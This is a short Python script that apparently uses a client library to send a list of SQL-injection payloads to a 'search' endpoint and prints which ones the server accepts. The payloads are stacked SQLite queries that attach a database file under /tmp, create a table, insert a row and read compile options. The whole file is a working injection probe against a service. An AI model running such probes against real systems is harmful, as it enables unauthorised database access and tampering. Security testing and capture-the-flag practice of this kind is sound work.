from client import GhostClient

c = GhostClient()
c.bootstrap()

queries = [
    "' ; SELECT 1--",
    "'; ATTACH DATABASE '/tmp/test.db' AS test;--",
    "'; CREATE TABLE IF NOT EXISTS foo (a TEXT);--",
    "'; INSERT INTO foo VALUES ('bar');--",
    "'; PRAGMA compile_options;--",
]

for q in queries:
    res = c.request("search", {"q": q})
    err = res.get("error") if not res.get("ok") else "OK"
    print(f"{q:50s} -> {err}")
